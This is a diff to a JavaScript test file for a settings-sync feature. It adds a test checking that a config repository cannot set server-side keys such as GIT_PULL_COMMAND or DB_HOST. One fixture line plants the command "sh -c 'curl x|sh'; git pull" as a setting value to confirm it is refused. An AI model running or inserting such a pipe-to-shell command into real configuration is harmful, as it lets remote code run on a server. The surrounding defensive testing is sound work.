@@ -91,7 +91,7 @@ const readRaw = (repo, file) => fs.readFileSync(path.join(fx.ROOT, repo, file));
 
 beforeEach(() => {
   process.env.CHAT_KEY = "sk-from-env";
-  delete process.env.JOB_RETENTION_DAYS;
+  for (const name of ["JOB_RETENTION_DAYS", "GIT_PULL_COMMAND", "ACCESS_TOKEN_ISSUER", "AUDIT_RETENTION_DAYS"]) delete process.env[name];
   delete process.env.DEFAULT_LANGUAGE;
   for (const name of ["ENABLE_MCP", "MCP_READ_ONLY", "MCP_CHAT_FORMS_ONLY"]) delete process.env[name];
   fs.rmSync(MANAGED, { force: true });
@@ -210,6 +210,28 @@ describe("the System > General settings, by their environment names", () => {
     assert.match((await RepoObjects.syncRepository(await desc("general"), "cfg")).refused[0].reasons[0], /DB_PASSWORD must be an \$\{ENV\} reference/);
   });
 
+  test("never what runs, connects or loads code : refused with why, and a save from the page never writes it", async () => {
+    const { REPOSITORY_REFUSED, repositoryRefusal, saveEnvValues } = await import("../src/lib/envSave.js");
+    for (const name of ["GIT_PULL_COMMAND", "MYSQLDUMP_COMMAND", "DB_HOST", "LOG_PATH", "CONTENT_SECURITY_POLICY", "USE_YTT", "REST_ALLOWED_HOSTS", "TRUST_PROXY", "HTTPS_KEY"]) {
+      assert.ok(repositoryRefusal(name), name);
+    }
+    assert.equal(repositoryRefusal("JOB_RETENTION_DAYS"), null);
+    assert.ok(REPOSITORY_REFUSED.length);
+    writeRaw("cfg", "general.yaml", "GIT_PULL_COMMAND: sh -c 'curl x|sh'; git pull\nDB_HOST: elsewhere\nJOB_RETENTION_DAYS: 30\n");
+    const summary = await RepoObjects.syncRepository(await desc("general"), "cfg");
+    const why = summary.refused[0].reasons.join(" ");
+    assert.match(why, /GIT_PULL_COMMAND is not one a repository may set: it is a command the server runs/);
+    assert.match(why, /DB_HOST is not one a repository may set: it says which database the app connects to/);
+    assert.equal(fs.existsSync(MANAGED), false, "nothing written");
+    // the page still saves it, and the file never gets it
+    writeRaw("cfg", "general.yaml", "JOB_RETENTION_DAYS: 30\n");
+    await RepoObjects.syncRepository(await desc("general"), "cfg");
+    const before = await RepoObjects.snapshot("general");
+    await saveEnvValues({ GIT_PULL_COMMAND: "git pull --ff-only", JOB_RETENTION_DAYS: "31" }, { user: "root" });
+    await RepoObjects.appUpdated("general", before);
+    assert.equal(fx.readText("cfg", ".", "general.yaml"), "JOB_RETENTION_DAYS: 31\n");
+  });
+
   test("a save from the page rewrites the file, its secrets never", async () => {
     writeRaw("cfg", "general.yaml", "# ops\nJOB_RETENTION_DAYS: 30\n");
     await RepoObjects.syncRepository(await desc("general"), "cfg");
@@ -227,12 +249,12 @@ describe("the System > General settings, by their environment names", () => {
     assert.equal(process.env.JOB_RETENTION_DAYS, "30");
     const { saveEnvValues } = await import("../src/lib/envSave.js");
     const before = await RepoObjects.snapshot("general");
-    // a number, and a text that looks like one (TRUST_PROXY is a text : a hop count or addresses)
-    await saveEnvValues({ AUDIT_RETENTION_DAYS: "200", TRUST_PROXY: "1" }, { user: "root" });
+    // a number, and a text that looks like one (ACCESS_TOKEN_ISSUER is a text, whatever it reads)
+    await saveEnvValues({ AUDIT_RETENTION_DAYS: "200", ACCESS_TOKEN_ISSUER: "1" }, { user: "root" });
     await RepoObjects.appUpdated("general", before);
     assert.equal(
       fx.readText("cfg", ".", "general.yaml"),
-      "# ops settings\n# kept by the platform team\nAUDIT_RETENTION_DAYS: 200\nJOB_RETENTION_DAYS: \"30\"\nTRUST_PROXY: \"1\"\n",
+      "# ops settings\n# kept by the platform team\nACCESS_TOKEN_ISSUER: \"1\"\nAUDIT_RETENTION_DAYS: 200\nJOB_RETENTION_DAYS: \"30\"\n",
     );
     CrudModel.flushAllLocal();
     assert.equal((await RepoObjects.syncRepository(await desc("general"), "cfg")).unchanged, 1);
